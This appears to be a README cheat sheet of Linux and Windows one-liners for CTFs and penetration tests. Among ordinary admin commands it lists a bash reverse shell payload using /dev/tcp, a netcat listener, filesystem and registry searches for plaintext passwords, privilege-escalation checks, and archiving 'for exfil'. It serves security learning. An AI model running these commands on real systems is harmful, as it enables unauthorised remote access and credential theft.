# ⚙️ Awesome CMD One-Liners for Linux & Windows

Welcome to my curated collection of powerful one-liners used across CTFs, pentests, and day-to-day cybersecurity tasks. Whether you’re trying to pop a shell, enumerate a box, or just make your workflow smoother, these quick commands will save time and deliver results.

---

## ⚠️ Legal & Ethical Disclaimer

> This repository is **for educational purposes only**.  
> Use these commands only on systems you own or have **explicit permission** to test.  
> I am not responsible for any unauthorized use or damage caused by the misuse of these commands.

---

## 🐧 Linux One-Liners (11)

| Command | Description |
|--------|-------------|
| `find / -perm -4000 2>/dev/null` | 🔍 Find all SUID binaries — great for local privilege escalation |
| `nc -lvnp 4444` | 🦻 Start a listener on port 4444 using Netcat |
| `curl ifconfig.me` | 🌍 Get your public IP address via CLI |
| `grep -r "password" / 2>/dev/null` | 🔑 Hunt for password strings across the filesystem |
| `sudo -l` | 🧯 Check sudo privileges — useful for escalation |
| `ip a` | 📡 View all IP addresses and interfaces |
| `wget http://[IP]/file` | 📥 Download a file from a remote server (HTTP) |
| `scp user@host:/path/to/file .` | 📦 Securely copy a remote file to your system |
| `chmod +x script.sh && ./script.sh` | 🛠️ Make a script executable and run it |
| `echo 'bash -i >& /dev/tcp/IP/PORT 0>&1'` | 🐚 Quick reverse shell payload |
| `tar -cvf archive.tar folder/` | 📁 Archive a folder (useful for exfil or CTF) |

---

## 🪟 Windows One-Liners (4)

| Command | Description |
|--------|-------------|
| `whoami /priv` | 🔐 Display user privileges — great for privilege escalation checks |
| `netstat -ano` | 🌐 View active connections with associated PIDs |
| `type C:\Users\*\Desktop\*.txt` | 📂 Read all `.txt` files on user desktops (CTF classic move) |
| `reg query HKLM /f password /t REG_SZ /s` | 🕵️‍♂️ Search Windows registry for stored plaintext passwords |

---

## 📎 How to Use

- Clone this repo for quick reference
- Memorize or script your favorites
- Expand it with your own daily-use gems!

---

## 🤝 Contributions Welcome!

Have a killer one-liner? Open a pull request and let’s grow this arsenal together.

---

> 🧠 "One good command can save hours of hard work."
